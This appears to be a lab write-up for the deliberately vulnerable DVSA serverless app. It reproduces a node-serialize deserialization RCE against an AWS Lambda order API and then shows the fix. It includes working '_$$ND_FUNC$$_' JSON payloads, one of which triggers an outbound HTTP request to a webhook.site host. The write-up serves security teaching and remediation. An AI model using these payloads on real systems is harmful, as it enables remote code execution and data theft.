**Lesson 3: Sensitive Information Disclosure (Code Injection)**
===============================================================

* * * * *

**Overview**
------------

This lesson demonstrates a **Sensitive Information Disclosure vulnerability** caused by unsafe deserialization in a serverless application.

By injecting malicious JavaScript into user input, an attacker can execute code inside an AWS Lambda function, potentially interacting with backend services and exposing sensitive data (such as receipts stored in S3).

* * * * *

**Goal**
--------

-   Show that the `/order` API executes user-supplied code
-   Confirm remote code execution (RCE)
-   Demonstrate backend interaction and outbound communication
-   Analyze why full data extraction is limited

* * * * *

**Requirements**
----------------

Before starting, make sure you have:

-   Access to DVSA web application
-   Browser (Chrome recommended)
-   Postman
-   Access to **webhook.site**
-   AWS CloudWatch access

* * * * *

**Step-by-Step Reproduction**
-----------------------------

* * * * *

### **Step 1: Create a Normal Order**

1.  Open DVSA application
2.  Add any product to cart
3.  Proceed to checkout

* * * * *

### **Step 2: Capture API Request**

1.  Open **Developer Tools (F12)**
2.  Go to **Network tab**
3.  Perform an action (checkout/order)
4.  Find request:

```
POST /Stage/order
```

1.  Copy:

-   Request body
-   Authorization token

* * * * *

### **Step 3: Test Request in Postman**

1.  Open Postman
2.  Create POST request:

```
https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order
```

1.  Add headers:

```
Authorization: <your_token>Content-Type: application/json
```

1.  Send a normal request → confirm API works

* * * * *

### **Step 4: Test Code Injection (RCE)**

1.  Go to **webhook.site** and generate a URL
2.  Send payload:

```
{  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<webhook-id>?test=hello')}",  "cart_id": "test"}
```

1.  Click **Send**

* * * * *

### **Step 5: Observe Result (Code Execution)**

Expected:

-   Request appears in webhook.site
-   Query string: `test=hello`
-   Source IP from AWS

See:

[Step 5 webhook rce](/vulnerabilities/lesson3_sensitive_data_exposure/evidence/step5_webhook_rce.png)


* * * * *

### **Step 6: Attempt Privileged Exploit**

Send advanced payload:

```
{  "action": "_$$ND_FUNC$$_function(){var aws=require('aws-sdk');}",  "cart_id": "test"}
```

* * * * *

### **Step 7: Observe Backend Behavior**

Expected:

-   API response:

```
500 Internal Server Error
```
See:

[Step 7 postman response](/vulnerabilities/lesson3_sensitive_data_exposure/evidence/step7_postman_response.png) 

* * * * *

### **Step 8: Check CloudWatch Logs**

Logs show:

-   `Cannot find module 'aws-sdk'`
-   Runtime execution errors


See:

[Step 8 aws sdk error](/vulnerabilities/lesson3_sensitive_data_exposure/evidence/step8_aws_sdk_error.png)


* * * * *

### **Step 9: Confirm Outbound Communication**

CloudWatch logs show:

-   `ECONNRESET`
-   References to `webhook.site`


See:

[Step 9 econnreset](/vulnerabilities/lesson3_sensitive_data_exposure/evidence/step9_econnreset.png)


* * * * *

**Attack Result (Before Fix)**
------------------------------

-   Code execution inside Lambda 
-   Outbound HTTP request triggered 
-   Backend execution confirmed 
-   Admin function invocation  (blocked by environment)

* * * * *

**Fix Applied**
---------------

### **1\. Remove Unsafe Deserialization**

Before:

```
const serialize = require('node-serialize');let obj = serialize.unserialize(userInput);
```

After:

```
let obj = JSON.parse(userInput);
```

* * * * *

### **2\. Input Validation**

```
if (typeof obj.action !== 'string') {    throw new Error("Invalid input");}
```

* * * * *

### **3\. Security Improvements**

-   Block function deserialization (`_$$ND_FUNC$$_`)
-   Add authorization checks
-   Apply least-privilege IAM roles

* * * * *

**Step 10: Verify After Fix**
-----------------------------

Send same malicious payload again:

Expected:

-   No webhook request
-   No code execution
-   API returns safe response

* * * * *

**Final Result**
----------------

| Phase | Behavior |
| --- | --- |
| Before Fix | Code execution + outbound requests |
| After Fix | Payload blocked |
| Normal User | Works correctly |

* * * * *

**Evidence Summary**
--------------------

-   Webhook → confirms RCE
-   CloudWatch (aws-sdk error) → confirms backend execution
-   CloudWatch (ECONNRESET) → confirms outbound attempt

* * * * *

**Key Lesson**
--------------

Unsafe deserialization allows attackers to execute arbitrary code inside serverless functions. Even if full exploitation is restricted, code execution alone is critical and can lead to data exposure in real-world systems.